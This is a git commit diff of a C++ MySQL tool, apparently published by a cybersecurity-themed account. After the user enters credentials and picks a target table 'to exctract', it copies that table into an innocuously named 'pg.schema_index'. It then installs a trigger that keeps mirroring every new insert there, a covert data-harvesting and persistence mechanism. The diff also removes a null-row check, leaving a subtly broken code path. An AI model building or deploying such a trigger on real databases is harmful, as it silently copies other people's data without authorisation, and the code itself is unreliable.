a4fa1ee4f018d9337f8b3fb86363016fe8a8d139
S12cybersecurity <79543461+S12cybersecurity@users.noreply.github.com>
2023-03-23 22:42:41 +0100

    Add files via upload

--- App.cpp
+++ App.cpp
@@ -10,23 +10,31 @@ int main() {
     string database;
     string table;
     string column;
+    string user;
+    string password;
+    string server;
 
-    SQL sql = SQL("localhost", "root", "password", "mysql");
+    cout << "Enter server (Example Recommended: localhost): ";
+    cin >> server;
+    cout << "Enter user: ";
+    cin >> user;
+    cout << "Enter password: ";
+    cin >> password;
+    SQL sql = SQL(server.c_str(), user.c_str(), password.c_str(), "mysql");
 
     con = sql.connect();
     if (!con) {
         std::cout << "Failed connecting";
     }
     else {
-        std::cout << "Connection succesfully\n\n";
-        std::cout << "Database List:\n";
+        std::cout << "Connection with database succesfully\n\n";
+        std::cout << "Choose Database to exctract";
         database = sql.listDatabases();
+        std::cout << "\nChoose Table to exctract:\n";
         table = sql.listTables(database);
         sql.createDatabase(database, table);
         sql.copyData(database, table);
         column = sql.getFirstColumnName();
-        cout << "sdad";
         sql.createTrigger(database, table);
-        cout << "final";
     }
 }
--- SQL.h
+++ SQL.h
@@ -76,14 +76,13 @@ public:
             i++;
         }
         // question int from database and save name in string
-        cout << "Select database: ";
+        cout << "\nSelect database: ";
         int db;
         cin >> db;
         string database;
         mysql_data_seek(res, db - 1);
         row = mysql_fetch_row(res);
         database = row[0];
-        cout << "Selected database: " << database << endl;
         return database;
     }
 
@@ -108,25 +107,24 @@ public:
         mysql_data_seek(res, table - 1);
         row = mysql_fetch_row(res);
         tableName = row[0];
-        cout << "Selected table: " << tableName << endl;
         return tableName;
     }
 
     // create new database called pg with table called  schema_index with same columns as the selected table from the selected database
     void createDatabase(string database, string table) {
         if (mysql_query(conn, "CREATE DATABASE IF NOT EXISTS pg")) {
-            cout << "Error en la consulta SQL 'CREATE DATABASE IF NOT EXISTS pg': " << mysql_error(conn) << endl;
+            cout << "Error in SQL query 'CREATE DATABASE IF NOT EXISTS pg': " << mysql_error(conn) << endl;
         }
         if (mysql_query(conn, "USE pg")) {
-            cout << "Error en la consulta SQL 'USE pg': " << mysql_error(conn) << endl;
+            cout << "Error in SQL query 'USE pg': " << mysql_error(conn) << endl;
         }
         string query = "SHOW COLUMNS FROM " + table + " IN " + database;
         if (mysql_query(conn, query.c_str())) {
-            cout << "Error en la consulta SQL 'SHOW COLUMNS FROM " << table << " IN " << database << "': " << mysql_error(conn) << endl;
+            cout << "Error in SQL query 'SHOW COLUMNS FROM " << table << " IN " << database << "': " << mysql_error(conn) << endl;
         }
         MYSQL_RES* result = mysql_store_result(conn);
         if (!result) {
-            cout << "No se pudo almacenar el resultado de la consulta" << endl;
+            cout << "Could not store result of query" << endl;
         }
         string create_table_query = "CREATE TABLE schema_index (";
         MYSQL_ROW row;
@@ -159,54 +157,53 @@ public:
         create_table_query += ")";
 
         if (mysql_query(conn, create_table_query.c_str())) {
-            cout << "Error en la consulta SQL 'CREATE TABLE schema_index': " << mysql_error(conn) << endl;
+            cout << "Error in SQL query 'CREATE TABLE schema_index': " << mysql_error(conn) << endl;
         }
     }
+
 
     // exctract data from the selected table from the selected database and copy the data to the table schema_index in the database pg
     void copyData(string database, string table) {
         string query = "INSERT INTO pg.schema_index SELECT * FROM " + database + "." + table;
         if (mysql_query(conn, query.c_str())) {
-            cout << "Error en la consulta SQL 'INSERT INTO pg.schema_index SELECT * FROM " << database << "." << table << "': " << mysql_error(conn) << endl;
+            cout << "Error in SQL query 'INSERT INTO pg.schema_index SELECT * FROM " << database << "." << table << "': " << mysql_error(conn) << endl;
             return;
         }
-        cout << "Los datos han sido copiados exitosamente" << endl;
+        cout << "Data has been successfully copied" << endl;
     }
 
     // method to exctract first column name of index_schema table in pg database
     string getFirstColumnName() {
         string query = "SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME='schema_index' AND TABLE_SCHEMA='pg' LIMIT 1";
         if (mysql_query(conn, query.c_str())) {
-            cout << "Error en la consulta SQL 'getFirstColumnName': " << mysql_error(conn) << endl;
+            cout << "Error in SQL query 'getFirstColumnName': " << mysql_error(conn) << endl;
             return "";
         }
         MYSQL_RES* result = mysql_store_result(conn);
         if (result == NULL) {
-            cout << "Error al almacenar el resultado de la consulta SQL 'getFirstColumnName': " << mysql_error(conn) << endl;
+            cout << "Error storing result of SQL query 'getFirstColumnName': " << mysql_error(conn) << endl;
             return "";
         }
         MYSQL_ROW row = mysql_fetch_row(result);
         if (row == NULL) {
-            cout << "No se encontró ningún resultado para la consulta SQL 'getFirstColumnName'" << endl;
+            cout << "No results found for SQL query 'getFirstColumnName'" << endl;
             mysql_free_result(result);
-            return "";
         }
         string firstColumnName = row[0];
         mysql_free_result(result);
         return firstColumnName;
     }
 
+
     void createTrigger(string database, string table) {
         // Get the first column name from schema_index table in pg database
         string column_name = getFirstColumnName();
         string db = "USE " + database;
         mysql_query(conn, db.c_str());
-
-
         if (column_name.empty()) {
-            cout << "Error: No se pudo obtener el nombre de la primera columna de la tabla schema_index" << endl;
+            cout << "Error getting first column name" << endl;
+            return;
         }
-
         // Create the trigger query with the obtained column name
         string trigger_query = "CREATE TRIGGER copy_to_schema_index "
             "AFTER INSERT ON `" + database + "`.`" + table + "` "
@@ -215,7 +212,8 @@ public:
 
 
         if (mysql_query(conn, trigger_query.c_str())) {
-            cout << "Error en la consulta SQL 'CREATE TRIGGER': " << mysql_error(conn) << endl;
+            cout << "Error in SQL query 'CREATE TRIGGER copy_to_schema_index': " << mysql_error(conn) << endl;
+            return;
         }
 
     }
